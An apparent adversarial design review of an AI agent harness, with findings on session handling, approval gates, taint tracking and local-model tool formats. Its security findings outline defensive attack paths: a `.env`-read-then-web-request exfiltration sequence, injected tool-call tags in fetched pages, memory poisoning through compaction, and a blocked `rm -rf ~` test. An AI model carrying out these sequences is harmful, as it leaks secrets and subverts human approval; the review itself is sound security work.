# Solo harness: adversarial design review (council style, 2026-09-26)

Subject: `02_plan/output/solo-harness-design-2026-09-26.md` and S1's implementation, committed at
`e0e13ab` (`packages/trent-core/src/solo/**`; the working tree has no diff from it). Read-only review:
no model calls, no commits, no edits other than this file. Line numbers are at `e0e13ab`.

Read end to end: the design; `solo/{types,parse,prompt,events,turn,runner,meter,index}.ts` and the
five test files; `docs/sessions/2026-09-26-s1-solo-loop.md`; the Hermes inventory (loop, sessions,
compaction, memory, skills, delegation, approvals); `local-models-2026-09-26.md` (sections 0, 5, 6.1, 8)
and the L0-4 live smoke in `docs/sessions/2026-09-26-l0-4-doctor.md`; the landscape; `governance/
{bound-approvals,idempotent-dispatch,policy-rules,policy-dispatch,hardline,autonomy,autonomy-dispatch,
provenance,tool-call-context}.ts`; `tools/index.ts` (the chain); `sessions/compaction.ts`;
`fleet-memory/tiers.ts`; `apps/cli/src/repl/{engine,render,approvals,compact,index,conversation,
fleet-memory}.ts`; `gateway/{GatewayManager,RunApprovalLink}.ts`; `apps/cli/src/gateway/agent-handler.ts`;
`apps/cli/src/commands/groups/servers.ts`; `a2a/TaskLifecycle.ts`; `apps/cli/src/runtime/headless.ts`.

What S1 gets right, and all three reviewers agree: option 1 (a second `AgentRunner`) is the right
shape; the loop is small and bounded four ways; a held call goes through `dryRun` inside the run's
`(runId, stepId)` context, so the bound row is stamped (`autonomy-dispatch.ts:186`) and the replay after
a yes is granted for exactly that call (`bound-approvals.ts:197-202`); idempotency keys come out right
because the action string reaches the adapter verbatim (`parse.ts:92`, `idempotent-dispatch.ts:81`);
every stop ends in one terminal frame with a P2-11 verdict. The findings below are about what happens
when this runner meets the surfaces, the session and a small model.

---

## Reviewer A: Hermes Agent maintainer (the single-agent loop should feel like Hermes)

**A1. blocker. The conversation has two writers.**
Evidence: the REPL persists every turn through its `Conversation` sink (`repl/engine.ts:390-391` records
the user line, `:414-417` the answer); the gateway handler appends the user message and the reply
(`apps/cli/src/gateway/agent-handler.ts:125,131`); the solo runner appends the user line, every
assistant reply with its blocks, and every tool result (`solo/runner.ts:120`, `solo/turn.ts:182,233,240`).
If S2 backs `SoloSession` with the surface's session, every turn is written twice and the next run
replays the duplicates. S1 names this (session log, follow-up 3) but the design does not decide it.
Fix: in solo the runner's `SoloSession` port is the only writer. S2 backs it with `SessionManager` for
the surface's session id and disables the REPL sink and the agent-handler appends in solo mode; the
REPL still folds `TurnOutcome` for the ticker. Test: one REPL turn with one tool call leaves exactly
`[user, assistant(block), tool, assistant]` in the session file.

**A2. blocker. A runner is one conversation; the design builds one per process.**
Evidence: `SoloRunnerDeps.session` is a single session (`solo/types.ts:109`); the system prefix is frozen
per runner (`solo/runner.ts:61,67-74`); `start()` abandons every run nobody is reading (`runner.ts:104`);
the gateway serves every chat thread from one runtime (`agent-handler.ts:128`); the design specifies "one
factory `createRunnerForMode(config, deps)`" (design line 66). Built once per process, every Telegram
thread shares one conversation and one prefix, and a message on thread B abandons thread A's parked call.
Fix: the factory returns a per-session cache, `runnerFor(sessionId)`; abandonment is scoped to that
session; an approval router maps `runId -> runner` for the approval link and the REPL.

**A3. blocker. The REPL never shows a card for the second held call of a solo run.**
Evidence: the engine dedupes gate frames by `${runId}/${stepId}` (`repl/engine.ts:446-450`) and clears
the set once per turn (`:388`); a solo run has one step for all its calls (`runner.ts:109`); a stream
pulled past a gate with no decision ends (`runner.ts:90`). A run that asks for two sends gets a card for
the first; the second gate is skipped, the renderer draws "awaiting your approval" (its own set is
cleared on `step_approved`, `render.ts:223`), no card opens, `y`/`n` do nothing, and the stream ends
parked. Seats rarely gate twice in one step; solo gates every floored call in the same step.
Fix: key the dedupe per held call (`${runId}/${stepId}/${detail}`, the detail carries the row id) or clear
the key on `step_approved`. Test: two `social_post` calls in one run give two cards and two executes.

**A4. should. The transcript renders fleet chrome, not a conversation.**
Evidence: every turn prints `Objective: ...` (`render.ts:184-185`), an agent start line and an agent done
line (`:196-199`, `:228-233`) and "Run complete" (`:242-243`) around one answer. A Hermes user expects:
their line, the tool lines, the answer.
Fix: a renderer option `mode: "solo"` that suppresses those four lines; no new event kind is needed. The
banner names the mode, the model, the effective context and the autonomy level.

**A5. should (stopgap now, streaming later). Nothing moves on screen while the model thinks.**
Evidence: the loop calls `complete`, not `stream` (`turn.ts:213`); on the 9B one 170-token prompt took
36.7 s with Ollama otherwise idle (`docs/sessions/2026-09-26-l0-4-doctor.md:92`). Hermes streams tokens.
Fix: S2 emits `heartbeat` frames (an existing kind) carrying elapsed seconds and tokens so far, and the
REPL shows them as one status line; token streaming is a later wave (it needs a delta the 20 kinds lack).

**A6. should. The cap throws the work away.**
Evidence: at 25 calls the run fails with a verdict and no answer (`turn.ts:176-179`, `stops.test.ts:96-103`);
the misuse stop does the same (`turn.ts:193-194`). Hermes gives a final grace call at `max_turns`
(inventory line 89), and the app's seat loop has a max-steps fallback (S1 log line 23).
Fix: at the cap and at the misuse stop, one last model call with the tool protocol removed ("no more
tools: answer from what you have"), any block in that reply ignored; the verdict still records the cap.

**A7. should. Skills on demand need an index the model can see.**
Evidence: `skills_list` / `skill_view` exist as tools (`tools/skills/`), but nothing in the solo prefix tells
the model which skills exist; Hermes's three-level load starts from an index in the prompt (inventory
line 238). In the fleet the org skills index is a STABLE block and the seat's skills a CONTEXT block
(`fleet-memory/tiers.ts:13-14,70-71`); solo's memory port is S3's and says nothing about skills. The
improvement injector writes after the stable tier (`tiers.ts:226`) through the fleet hook, which solo does
not pass through.
Fix: S3's memory adapter puts the skills index (name plus one line) in the stable tier; a `/skill <name>`
REPL command puts the body into the next user message, not the prefix; promoted improvements reach the
solo prefix through the same stable block or are declared out of scope. No new hook is needed.

**A8. should. Compaction must re-inject and re-freeze.**
Evidence: the stable tier is frozen for the runner's life (`runner.ts:67-74`); the compaction flush writes
facts to memory (`sessions/compaction.ts:292-296`) that the frozen prefix will never show in this session,
while the turns they came from have been dropped; the summary is free text (`repl/compact.ts:96`). Hermes
summarises into fixed headings (Goal, Constraints, Progress, Decisions, Files, Next steps; inventory
line 81); the landscape adopts Claude's rule that compaction re-injects instructions, memory and the plan.
Fix: a compaction is already a cache miss, so the first run after one rebuilds the prefix (fresh memory,
fresh skills index); the todo list and the last objective are re-injected after the summary; the summary
uses fixed headings.

**A9. should. Interrupted and failed turns are replayed as if they were whole.**
Evidence: the REPL marks an interrupted answer so it is never re-threaded (`engine.ts:413-416`); solo has
already persisted the assistant blocks and tool results as they happened (`turn.ts:182,240`) and marks
nothing when the run is cancelled, capped or fails to parse, so the next run's history ends in a tool
result with no answer.
Fix: on cancel and on fail, append one assistant message with `metadata.status` `interrupted` or
`failed` naming the verdict, so the model knows the turn ended without an answer.

**A10. should. `/rollback` changes the files but not what the model believes.**
Evidence: checkpoints are ledgered per turn (`runtime/headless.ts:422-426`, `docs/checkpoints.md`); after a
rollback the solo history still says the file was written. `SoloCheckpoints.beginTurn()` drops the seat
argument the session accepts (`solo/types.ts:92` vs `checkpoints/session.ts:61`).
Fix: `/rollback` in solo appends a note to the session naming the turns and paths undone; the runner
calls `beginTurn(SOLO_SEAT)`.

**A11. should. `delegate_task` does nothing in solo today.**
Evidence: without a port the tool returns `not_available` (`tools/delegate/index.ts:153-155`); the design
promises a child solo run (design lines 58-59) but S1 binds no port. The schema tells the model a child
"has read-only shared memory" (`delegate/index.ts:38`) and fans out with `Promise.all` (`:157`).
Fix (S3): a `DelegatePort` that runs a child solo runner on an ephemeral in-memory session, with the
parent's tool build minus `delegate_task`, `ask_human` and `clarify`, memory read-only, the human adapter's
caller context bound as delegated, depth 1, children run one at a time on local providers, the child's
spend added to the parent's `step_end`, and the child's untrusted tag carried up (the adapter already does
that part, `delegate/index.ts:158`).

**A12. should (blocker for the gateway). Solo frames never reach the bus hooks.**
Evidence: the gateway sends approval cards through a bus hook passed to the runtime
(`commands/groups/servers.ts:163`) and releases steps on `runtime.orchestrator` (`:175-181`); the trace
writer, the fleet-memory trace and spend charging ride the same `traceSink`
(`runtime/headless.ts:380-386`). The solo runner has no bus: its frames go only to whoever iterates
`run()`. On the gateway, a held call in solo sends no card to the owner and writes no trace for the
improvement loop.
Fix: S2 wraps the solo stream in a tee that hands every frame to the runtime's `traceSink` and
`busHooks`, and points the approval link at the A2 router.

---

## Reviewer B: security engineer (side-effect gate, egress broker, audit chain)

**B1. blocker. The taint resets every turn while the tainted text stays in the prompt.**
Evidence: the policy ring is keyed by run id (`governance/policy-dispatch.ts:46-48`); the provenance ledger
by run and step (`governance/provenance.ts:126-129`); solo makes a new run id for every user message
(`runner.ts:107`) and replays the whole history into it (`runner.ts:110,126`). So: `read_file .env` in
turn 1, then `web_extract {"url": "https://host/?k=<value>"}` in turn 2, and `network-after-secret`
(`policy-rules.ts:59`) never fires, because the ring is empty. A web page read in turn 1 followed by a
`memory` write in turn 2 is not held (`provenance.ts:200`). Sends keep a human because the class floor
asks at every level (`autonomy.ts:74-79`), but network exfiltration and memory poisoning lose theirs.
The rule's own text, "nothing leaves the machine until a new run starts" (`policy-rules.ts:58`), assumes
a new run starts with a clean context, which is false in solo.
Fix: `ToolCallContext` gains `sessionId`; the policy ring and the provenance ledger key on it when it is
present; solo passes it; each tool message persists its classes and provenance in metadata and the runner
re-seeds the ring and ledger from the session when it is built (so a restart does not launder); only
`/new` clears it; `/status` shows the taint and the call that caused it. Test: the two-turn scripts above.

**B2. blocker. A typed answer can approve a post.**
Evidence: `questionFromEvent` takes the newest `needs_approval` record of a card adapter in the step's
cumulative list (`tools/human/index.ts:187`); solo's gate frames carry every record of the run
(`events.ts:100-107`); an answered `ask_human` hold stays in that list with status `needs_approval`
(`turn.ts:181`); `answer()` stores the text and releases whatever call is held (`runner.ts:173-179`); the
gateway turns a question-shaped gate into a question row and releases it with `answer`
(`gateway/RunApprovalLink.ts:103-105,77-79`). Sequence: `ask_human` answered, later `social_post` held,
the card shown is the old question, the owner types a reply, the post executes.
Fix: `answer()` returns false unless the held adapter is in `CARD_ADAPTER_NAMES`; the gate frames name
the held call itself (`seatLoopState.pendingToolCall`, which `questionFromEvent` reads first), and a
resolved hold's record is replaced in the list, not left as `needs_approval`. Test: the sequence above
opens an approval card, not a question.

**B3. blocker for S3. Compaction's memory flush launders untrusted tool output into shared memory.**
Evidence: the flush asks a model for "durable facts" in the dropped turns and writes each through
`memory.execute` directly (`sessions/compaction.ts:272-296`); the REPL hands it `fleetMemory.memory`
(`repl/index.ts:232-237`, `repl/compact.ts:126-127`), which is not wrapped by the provenance gate that
exists to stop exactly this (`provenance.ts` header). In fleet mode the stored session carries answers;
in solo it carries raw tool results (`turn.ts:182`), including web pages and inbound messages.
Fix: the flush goes through the provenance-wrapped memory adapter inside a tool-call context carrying the
session's taint (so it holds, per B1), or skips dropped turns that hold an untrusted record; a summary
made from untrusted turns is itself marked untrusted.

**B4. blocker for any parity claim. Solo writes nothing to the signed audit chain.**
Evidence: the chain is the app's `AuditLog` (`audit/export.ts:1-8`), appended only on app paths (routing
and handoff in `apps/web/lib/planner.ts:385,397`, approval resolution in
`apps/web/lib/agent-mission-approval-hook.ts:46`, MCP calls in `apps/web/lib/mcp-tool-adapter.ts:199,373`);
`StorePort` has no append (`store/StorePort.ts:216-221`); nothing under `solo/` writes one. A solo
session's sends, approvals and rejections leave no row `trent audit verify` can walk, while the signed
audit is the first thing the README says Trent does better (landscape, "Where Trent stays ahead").
Fix: S2 adds an audit sink port (lazy import of the app writer, the pattern `repl/fleet-memory.ts:171-190`
uses for episodic writes) recording run start, each gate decision and who made it, each side-effecting
call's outcome, and run end. If that slips, S4's docs say plainly that solo runs are outside the chain.

**B5. should. The gate chain is assumed, not enforced or tested.**
Evidence: `SoloTools` accepts any `{ adapters }` (`solo/types.ts:33-35`); every gate test uses a fake adapter
with its own approval function (`gate.test.ts:20`), so no test runs a call through the real autonomy,
policy, idempotency and provenance wrappers; `memory` and `fleet_search` are "registered by the
fleet-memory hook, not by this builder" (`tools/index.ts:269`), so S2 or S3 could append them after the
chain.
Fix: accept only a `TrentToolBuild` (it carries `bindings` and `provenance`); add memory and fleet search
through `extraAdapters`, which the chain wraps (`tools/index.ts:373`). One integration test through
the real chain in a temp profile: autonomy `never`, `social_post` parks, approve, exactly one execute,
bound row decided; `rm -rf ~` blocked by the hardline; `.env` read then send denied within one run.

**B6. should. A hold raised by `execute` after a yes re-parks forever.**
Evidence: the loop parks on any `needs_approval` record (`turn.ts:184-189`), including one that `execute`
returns after the human said yes (`turn.ts:140`). The provenance hold (`provenance.ts:200-214`) and an
adapter's own `requireBoundApproval` (a row made by `require` has no `previewedAt`, so the replay is never
granted implicitly, `bound-approvals.ts:191-194,197`) both return `needs_approval` again, so every `y`
parks again and each round files another held-write row.
Fix: only a `dryRun` hold parks the run. A `needs_approval` returned by `execute` is that call's result,
handed to the model with its row id and "decided with trent approvals", and counted by the misuse stop.

**B7. should. Calls and results have no boundary the model or the parser respects.**
Evidence: `parseReply` runs every `<tool_call>` block anywhere in the reply (`parse.ts:20,73`), including
one inside a fenced block the model is quoting (fences are stripped only inside a block, `parse.ts:23,85`);
results are rendered raw (`prompt.ts:117-121`), so a page or inbox message carrying `</tool_result>` or a
`<tool_call>` block sits in the prompt verbatim, and a model that quotes it runs it. The untrusted tag is
not rendered.
Fix: escape `<tool_call`, `</tool_call`, `<tool_result`, `</tool_result` inside summaries; render
`provenance="untrusted"` on the result tag; ignore blocks inside markdown fences in the reply.

**B8. should. Surfaces with no human park forever and fill the approval list.**
Evidence: a held call parks and waits (`runner.ts:10-16`); every new run id is a new key, so each cron tick
files another pending bound row (`bound-approvals.ts:191-194`). Hermes fails closed on unattended surfaces
(`approvals.cron_mode`, `single_query_mode`, `unattended_mode` default `deny`, inventory line 384).
Fix: a runner option `onHold: "park" | "deny"`. The REPL and the gateway (with an owner) park; cron,
heartbeat, `trent run` without `--wait`, A2A and ACP deny, and the model reads
`blocked: no human is attached to this surface`.

**B9. should. Abandoned and restarted parks leave false state behind.**
Evidence: an abandoned hold "stays in the transcript as that call's last word" (`runner.ts:14-15`) and its
bound row stays pending; a restart drops `runs` (`runner.ts:63`; S1 log follow-up 2). The model later
reads "held until a human approves exactly this call" and tells the user it is still waiting, and
`trent approvals approve` on that row releases nothing.
Fix: on abandon, and when a runner is built over a session whose tail holds an unanswered hold, append a
tool message `not run: superseded` (or `process restarted`) and mark the bound row expired (the store
needs an `expire(id)`; `decide` only takes approved or denied).

**B10. should. Decisions are recorded as the loop's, not the human's.**
Evidence: `approve` and `reject` set an in-memory flag (`runner.ts:162-167`); the replay then grants the row
as `"step approval"` (`bound-approvals.ts:197-202`); a rejection never touches the row, which stays
pending (`turn.ts:129-131`).
Fix: `approve` and `reject` take `decidedBy` and call `bindings.decide(rowId, ..., who)` before the loop
continues; the held record carries the row id as a field, not only in prose.

**B11. should. Raw tool output, secrets included, now lands in session files and every later prompt.**
Evidence: every result summary is persisted (`turn.ts:182`); a project `.env` read is classified as secret
access (`policy-rules.ts:138`) but not refused (the hardline covers only Trent's own `.env` and `~/.ssh`,
`hardline.ts:140-146`); fleet sessions store answers, not tool output. Hermes redacts secret-shaped strings
before they enter context (inventory line 395).
Fix: `redactText` (`errors/TrentError.ts:147`) on summaries before they are persisted and before they are
rendered, leaving a visible `[redacted]` marker.

**B12. should. The daily cap can be absent without anyone noticing.**
Evidence: the daily cap only applies when a ledger is passed (`solo/meter.ts:58`); the per-run map is never
pruned (`meter.ts:40`); concurrent runs each see only their own unwritten cents.
Fix: `createRunLedgerMeter` throws when `dailyCapCents` is set with no ledger, or defaults to the installed
spend ledger; entries are dropped at a terminal frame; S2 tests that the REPL, gateway and cron solo
meters each carry the ledger.

---

## Reviewer C: operator (16 GB laptop, local 9B model)

**C1. blocker for solo on local. The prompt teaches two formats, and neither is the model's own.**
Evidence: the protocol says `<tool_call>` then `read_file {"path": "README.md"}` (`prompt.ts:34-43`); the
tool disclosure pastes every adapter's instructions verbatim (`prompt.ts:68-72`), and those say
`action = "web_search {\"...\"}" with JSON keys:` (`tools/web/schemas.ts:29`). That escaped-string
`action =` shape is what the 9B mangled today (`"action": "read_file", {...}`, 1/5 on the smoke,
`docs/sessions/2026-09-26-l0-4-doctor.md:84-86,94`). Qwen3.5 and Hermes models are trained on
`<tool_call>{"name": ..., "arguments": {...}}</tool_call>`, and `parse.ts` rejects exactly that body: a
body starting with `{` has an empty head and is malformed (`parse.ts:59-62,87`). Also: the smoke measured
the seat contract, not solo's; solo's format has never been run on the 9B.
Fix: (a) S2: `parse.ts` also accepts the Hermes/Qwen body `{"name", "arguments"}` and normalises it to
`name {json}` before the adapter, so keys and bound rows are unchanged; (b) S2: solo renders the tool
disclosure as JSON Schema with no `action = "..."` line, and the protocol example uses the Hermes body;
(c) before S4, L1's constrained output on local providers: `response_format` over
`{"tool_calls": [{"name": <enum>, "arguments": {...}}]} | {"answer": "..."}`; (d) a solo case in the
doctor smoke.

**C2. blocker for solo on local. Nothing budgets the context inside a run.**
Evidence: every round's results are appended (`turn.ts:204`); one result may reach 24,000 chars
(`tools/spillover.ts:12`) and `web_extract` defaults to 15,000 (`tools/web/schemas.ts:34`); the 9B was
loaded at 32,768 tokens (L0-4 log line 84); nothing measures system plus history plus results before
`complete` (`turn.ts:209-213`). Three or four reads fill the window, and Ollama silently drops what
overflows (local-models F1).
Fix: before each call, measure the request against the effective window (the L0 probe and the G17
gate), prune the oldest tool results in `state.messages` to a one-line stub first (Hermes phase 1, no
model call, inventory line 81), and only then refuse; cap each result at a local budget (for example
4,000 chars) with the rest spilled to a file.

**C3. should (blocker on thinking models). `<think>` is parsed, run and replayed.**
Evidence: the parser reads the raw completion (`turn.ts:221`, `parse.ts:66-80`), so a block drafted inside
`<think>` runs; the think text becomes the answer (`turn.ts:233`) and is replayed as history every turn.
Fix: strip `<think>...</think>` (and the gpt-oss analysis channel) before parsing and before persisting
(local-models G7).

**C4. should. The fixed prompt is unmeasured and probably over budget.**
Evidence: the disclosure includes every visible adapter's full instructions (`prompt.ts:68-72`) up to a
threshold of 24 tools (`tools/tool_search/index.ts:35`); the stable tier alone may be 60,000 chars
(`fleet-memory/tiers.ts:80`); local-models P3 wants the fixed prompt at or under 25% of the window.
Fix: `trent prompt-size --solo` and a CI assertion at 32K and 64K; on local profiles a core set is
disclosed (file_ops, terminal, web, memory, skills, todo, tool_search) and the rest go behind
`tool_search`; refuse to start rather than truncate.

**C5. should. Compaction will fire every turn and fight the next turn for the only slot.**
Evidence: history 6,000 chars and compaction after 12,000 (`config/sections/context.ts:15`,
`sessions/compaction.ts:85-89`) were sized for a REPL history of answers only; solo stores tool results.
Each compaction costs two extra model calls (`repl/compact.ts:117-140`), fired and forgotten after each
answer (`repl/index.ts:242-245`), racing the next turn on a runtime with one slot (L0-4 log line 85), and
outside the solo meter.
Fix: a solo history budget in tokens from the effective window (compact at half the window, as Hermes
does, inventory line 79); prune tool results first with no model call; run the summary before the next
turn, not beside it, under the solo meter.

**C6. should. Nothing bounds time, and local work is invisible in `trent usage`.**
Evidence: local calls price at 0 (unpriced, `solo/meter.test.ts:52`), so the per-run and daily caps
(100 and 1,000 cents, `config/defaults.ts:23-25`) never fire; `trent usage` drops a group that spent
nothing (`governance/spend-report.ts:54`), so a local user sees no `trent` row at all; 25 calls at about
37 s each is over 15 minutes for one run.
Fix: `solo.max_run_seconds` (Hermes `agent.run_budget_seconds`, inventory line 89) checked with
`stopReason`; `trent usage` lists zero-cent groups with their tokens; the ticker shows tokens and elapsed.

**C7. should. One repair is too few for a 9B, and the failure discards the run.**
Evidence: a second malformed reply in a row fails the whole run and its tool work (`turn.ts:222-229`);
malformed replies do not count towards the cap. Local-models R2 allows two re-asks, the second
constrained.
Fix: on local providers two repairs, the second constrained once L1 lands; the repair prompt lists the
tools and shows the exact body for the tool the model tried to call.

**C8. should. No default `max_tokens`.**
Evidence: `maxTokens` is optional (`solo/types.ts:101`) and sent only when set (`runner.ts:56`); mlx
defaults to 512 and SGLang to 128 (local-models F1). A long `write_file` body is cut, the block is "not
closed", the repair is cut the same way, the run fails.
Fix: a local default (for example 4,096), and `finishReason: "length"` gets its own repair message ("your
reply was cut off; write a shorter call").

**C9. should. The misuse stop is too literal for a small model.**
Evidence: failures are counted per exact action string, whitespace-normalised only (`turn.ts:144-151`); a
9B that varies a path or a key order never trips it, and the loop runs to the cap. Hermes has a breaker
for repeated denied variations (inventory line 391).
Fix: also count failures per tool name (stop at 5) and per identical error summary.

**C10. should. One slot, many callers.**
Evidence: gateway threads, cron, compaction (C5) and delegation (`Promise.all` over up to 6 children,
`tools/delegate/index.ts:157`) share one local runtime; local-models F10 (KV thrash) and G6 (a gateway-side
queue) are L1 work.
Fix: solo on the gateway and cron with a local provider waits for the per-endpoint queue (G6); delegated
children run one at a time on local providers.

**C11. nit. Prefix reuse across turns is weaker than the design says.**
Evidence: the session stores the bare objective (`runner.ts:120`) while the request carried the context
block plus the objective (`runner.ts:126`); the held `needs_approval` record is in the next turn's history
but was never in the in-run messages (`turn.ts:181-182`). The system prefix is byte-identical, but each new
turn re-prefills from the previous turn's first message on.
Fix: accept it and say so, or persist the turn opening exactly as the history will render it. Measure it
with the doctor's prefix-cache check (D4) on the 9B.

---

## Chair: reconciliation

### The questions, answered

| Question | Answer | Findings |
|---|---|---|
| Every gate rule the seats honour? | Within one run, yes, provided the adapters come from `buildTrentTools`: the class floor asks at every level (`autonomy.ts:74-79`), the hardline, deny globs and approval floor refuse at `execute`, idempotency keys are exact, the bound row grants only the held call. Across turns, no: the policy ring and the provenance taint reset per run while the context persists. Nothing proves the chain is on. | B1, B5, B6 |
| Restart with a parked run? | It is lost silently. The bound row stays pending, the transcript says it is waiting, `trent approvals approve` releases nothing. | B9 |
| Is `<tool_call>` robust for small local models? | Not as written. The prompt teaches two conflicting formats and rejects the model's own trained body. Make the Hermes JSON body canonical in S2; constrained JSON on local providers (L1) is a hard prerequisite for solo on local, not for solo on cloud. | C1, C3, C8 |
| Compaction: what is re-injected, does the prefix survive? | The system prefix survives (it is outside the history), but it is frozen, so facts the flush writes are invisible for the rest of the session; nothing re-injects the todo list or the objective; the flush is unsafe in solo. | A8, B3, C5 |
| Two session owners? | Yes, they would corrupt each other. The runner must be the only writer. | A1 |
| Cost: ledger rows, `usage --by seat`, daily cap? | One row per model per run close (not per call; a parked run writes two), seat `trent`; `usage --by seat` hides a zero-cent local group; the daily cap holds only if S2 passes the ledger. No double charge through the runtime's `chargeSpend`: frames the run meter priced are skipped (`orchestrator/run-hooks.ts:142,195`). | B12, C6 |
| `delegate_task` in solo? | `not_available` today; S3 must bind a port. | A11 |
| Are `skills_list` / `skill_view` enough? | As tools, yes; the model also needs the index in the stable tier. No new hook. | A7 |
| Checkpoints and `/rollback`? | Writes are ledgered per turn and an empty turn is a no-op, so double `beginTurn` is harmless (`runtime/headless.ts:422-426`); the conversation is not told about a rollback. | A10 |
| REPL banner and `trent --solo`? | Banner: mode, model, effective context, autonomy level, "sends, payments and customer actions always ask". Solo render mode. `--solo` over `agent.mode`; switching mode needs a new session, because the prefix and the session shape differ. | A4 |
| Gateway (late approvals) and A2A (`input-required`)? | Gateway: the solo frames never reach the approval link (A12); after a decision nobody calls `resume` or posts the reply to the thread. A2A: a follow-up message starts a new run (`a2a/TaskLifecycle.ts:197-203`), which abandons the parked one. A peer must never approve a held call; the task settles when the owner decides, and until that exists A2A uses `onHold: "deny"`. | A2, A12, B8 |
| Where can a local model loop forever or burn the cap? | No unbounded loop without a human: the cap (25) plus one repair bounds it at about 50 calls. The human-in-the-loop loop is real (B6). On cloud the in-run context grows every round, so cost grows quadratically in calls until `per_run_cap` (100 cents) stops it. On local the cost is time (C6) and cron parking (B8). | B6, B8, C2, C6, C9 |

### Which findings are real
All 35 were re-checked against the cited lines. Real as stated: A1-A4, A6-A12, B1-B3, B5-B12, C1-C10.
Adjusted: **A5** is real, but streaming needs a delta kind S1 correctly refused to add; heartbeat is the
S2 stopgap and streaming moves past S4. **B4** is a blocker for the claim, not for the code: either S2
writes the rows or the docs exclude solo from the chain; the chair picks writing the rows, because solo
on the gateway sends things. **C11** is real and small. Checked and dismissed: double `beginTurn` (a
no-op), double spend charging (skipped by frame), idempotency keys (correct).

### Where the reviewers conflict, and the ruling
1. **Wire format (A against C).** A wants Hermes's own loop feel; C wants constrained JSON. The Hermes
   body `<tool_call>{"name", "arguments"}</tool_call>` is both Hermes's wire format and Qwen's trained
   one, and it is JSON L1 can constrain. Ruling: it becomes canonical; `name {json}` stays accepted; the
   adapter still receives `name {json}`, so keys and bound rows do not move. Native provider tool calling
   waits until the gateway takes a `tools` parameter.
2. **Taint scope (B against A).** A worries that one `.env` read makes a Hermes session unable to send.
   Ruling: session scope, because that is what the rule means once context persists; the deny stays a
   deny (a config rule with the same id replaces it, `policy-rules.ts:69-73`); `/new` clears it;
   `/status` says why sends are refused.
3. **Holds on unattended surfaces (A against B).** Ruling: park where a human is attached (the REPL, the
   gateway with an owner); deny everywhere else.
4. **The cap (A against S1).** Ruling: a grace answer with tools disabled; the verdict still names the cap.
   B has no objection, because no tool can run in that call.
5. **Compaction (A against C).** Compatible: prune tool results first with no model call, summarise only
   when that is not enough, re-freeze the prefix after.
6. **Durable park (S1 follow-up 2) against expiry (B9).** Ruling: expiry in S2, because it is cheap and
   honest; a durable park (a snapshot of the turn state without the messages, which are rebuilt from the
   session) in S3, only if gateway approvals that outlive a restart stay in scope.

### What S2, S3 and S4 must absorb, in order

**S2 (surfaces), before any surface reads `agent.mode`:**
1. A per-session runner factory and an approval router `runId -> runner` (A2).
2. The runner as the only session writer; REPL sink and gateway appends off in solo (A1).
3. Only a `TrentToolBuild` is accepted; memory and fleet search through `extraAdapters`; the real-chain
   integration test (B5).
4. Session-scoped policy ring and provenance ledger, persisted on tool messages and re-seeded on open (B1).
5. `answer()` only for card adapters; gate frames name the held call; resolved holds replaced (B2).
6. REPL gate dedupe per held call (A3).
7. Tee solo frames into `traceSink` and `busHooks`; on the gateway a resume driver that calls `resume` after
   a decision and posts the reply to the thread; `onHold: park | deny` by surface; A2A and ACP deny (A12, B8).
8. Only `dryRun` holds park; an `execute` hold is the call's result (B6).
9. Expire abandoned holds; decisions carry who made them (B9, B10).
10. Audit rows for run, gate decision, side-effecting call and end (B4).
11. Format: accept the Hermes body, JSON-Schema disclosure with no `action =` line, strip `<think>`, a
    default `max_tokens` on local, a `length` repair (C1a, C1b, C3, C8).
12. Escape tags in results, render provenance, ignore fenced blocks; redact before persisting (B7, B11).
13. The meter requires the ledger; `max_run_seconds`; zero-cent groups shown (B12, C6).
14. Grace answer at the cap and at the misuse stop; per-tool failure count (A6, C9).
15. Solo render mode, banner, `--solo`, heartbeat status line (A4, A5).

**S3 (continuity):**
1. Solo-safe compaction: token budget from the effective window, prune first, summary before the next
   turn under the solo meter, flush through the provenance-wrapped memory adapter with the session taint,
   fixed-heading summary, re-freeze the prefix, re-inject the todo list and the objective (B3, C5, A8).
2. In-run context budget with pruning (C2).
3. Skills index in the stable tier, `/skill <name>`, `solo.md` excluded from the brain block (A7; S1
   follow-up 1).
4. The delegation port as A11 specifies, children with `onHold: "deny"`.
5. `beginTurn(SOLO_SEAT)` and the rollback note (A10); interrupted and failed turn markers (A9).
6. A durable park, or the documented expiry (chair ruling 6).

**L1, which must land before S4's live proof:** constrained output for solo on local providers (C1c),
two repairs (C7), the per-endpoint queue (C10), the prompt-size CI budget (C4).

**S4 (docs and proof):**
1. `docs/solo.md` states: solo on local needs L1; which surfaces park and which deny; the session taint
   rule; what the audit chain records.
2. The live proof runs the solo smoke case on `qwen3.5:9b` after L1, and it must reach at least 4/5 before
   the README says solo works on local; a two-gate REPL run; the two-turn web-then-memory taint check;
   the fleet-vs-solo table with tokens, cents and seconds.

### What would make the chair reject the design
- Solo reaches any surface with a per-run taint while the context persists (B1). That is a regression
  against rules the fleet already ships.
- The answer-approves-a-post path (B2) is not closed before the gateway or the REPL runs solo.
- S2 builds one runner per process (A2), or leaves two writers on one session (A1).
- The compaction flush is reused unchanged for solo sessions (B3).
- The runner accepts adapters that did not come out of `buildTrentTools` (B5).
- Solo is documented as working on local models before C1, C2 and a measured smoke of at least 4/5.

---

## Verdict: APPROVE WITH CHANGES

The architecture stands: a second `AgentRunner`, a small bounded loop, and reuse of the gate chain
through `dryRun` and `execute` in the run's tool-call context. S1's code is sound for what it tested. The
changes are about integration and scope, not a redesign, and they are listed in order above. Five
blockers sit in S1's own code or its contract (A3, B1, B2, C1, C2); four more are S2/S3 wiring rules that
must be decided before those waves start (A1, A2, B3, B4).

Top five changes:
1. Scope the policy ring and the provenance taint to the session and persist them, so a new turn cannot
   launder a secret read or an untrusted page (B1).
2. Close the answer-approves-a-post path: `answer()` only for `ask_human`/`clarify` holds, and gate
   frames that name the held call (B2).
3. Build one runner per session with an approval router and a resume driver, make the runner the only
   session writer, and dedupe REPL gates per held call (A1, A2, A3, A12).
4. Use the model's own format: accept `<tool_call>{"name","arguments"}</tool_call>`, drop the
   `action = "..."` disclosure, strip `<think>`; ship solo on local only after L1's constrained output and
   an in-run context budget (C1, C2, C3).
5. Make compaction safe for solo: flush through the provenance-wrapped memory adapter with the session
   taint, prune tool results before summarising, and re-freeze the prefix afterwards (B3, C5, A8).
